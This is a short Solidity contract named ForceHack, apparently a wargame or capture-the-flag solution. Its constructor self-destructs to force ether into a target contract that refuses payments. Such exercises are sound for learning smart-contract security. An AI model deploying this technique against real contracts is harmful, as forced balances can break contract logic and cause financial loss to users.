// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

contract ForceHack {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}
